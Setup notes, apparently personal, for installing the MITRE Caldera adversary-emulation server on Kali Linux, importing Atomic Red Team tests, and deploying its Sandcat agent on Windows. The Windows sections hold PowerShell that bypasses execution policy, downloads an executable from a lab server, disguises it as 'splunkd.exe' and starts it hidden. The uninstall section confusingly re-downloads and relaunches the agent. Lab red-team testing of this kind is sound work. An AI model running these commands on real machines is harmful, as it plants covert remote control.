# Install Caldera on Kali Linux


## Install Caldera

- The --build flag is required the first time you run the server to bundle the UI dependencies
- python3 server.py --insecure --build

```
sudo apt install -y python3-venv
cd ~/caldera
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt
python server.py --insecure --build

```


### Start Caldera

```

sudo systemctl daemon-reload
sudo systemctl restart caldera
sudo systemctl status caldera

https://localhost:8888    admin / admin
```

### Clone Atomic Red Team

```
cd caldera/plugins/atomic/data
git clone https://github.com/redcanaryco/atomic-red-team.git

Ensure the folder is named exactly atomic-red-team
Filter by Source: In the Caldera UI, go to Abilities and filter by the "atomic" repository to see the imported tests.
```



## Install agent on Windows


```
Set-ExecutionPolicy Bypass -Scope Process -Force
Unblock-File .\sandcat.exe
Test-NetConnection 192.168.1.47 -Port 8888

$server="http://192.168.1.47:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;

```


## Uninstall Agent

```

get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -Force
Remove-Item "C:\Users\Public\splunkd.exe" -Force -ErrorAction Ignore

$server="http://192.168.1.47:8888"
$url="$server/file/download"

# Create WebClient and add required headers
$wc = New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go")

# Download the agent
$data = $wc.DownloadData($url)

# Write executable to disk
[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data)

# Start the agent pointing to server and group
Start-Process -FilePath "C:\Users\Public\splunkd.exe" -ArgumentList "-server $server -group red" -WindowStyle hidden

Get-Process splunkd

```

## uninstall Caldera

```                                                     
#!/usr/bin/env bash
# MITRE CALDERA Uninstall Script
# Run as a user with sudo privileges

set -euo pipefail

USER_HOME="${HOME}"
CALDERA_HOME="$USER_HOME/caldera5"
VENV_PATH="$USER_HOME/caldera_venv"
SERVICE_PATH="/etc/systemd/system/caldera.service"

echo "Stopping CALDERA service..."
sudo systemctl stop caldera || true
sudo systemctl disable caldera || true

echo "Removing systemd service..."
sudo rm -f "$SERVICE_PATH"
sudo systemctl daemon-reload

echo "Removing CALDERA directory..."
rm -rf "$CALDERA_HOME"

echo "Removing Python virtual environment..."
rm -rf "$VENV_PATH"

echo "Optional: Remove plugins directory if separate (usually inside $CALDERA_HOME)"
# rm -rf "$USER_HOME/caldera5/plugins"

echo "CALDERA has been uninstalled."


```
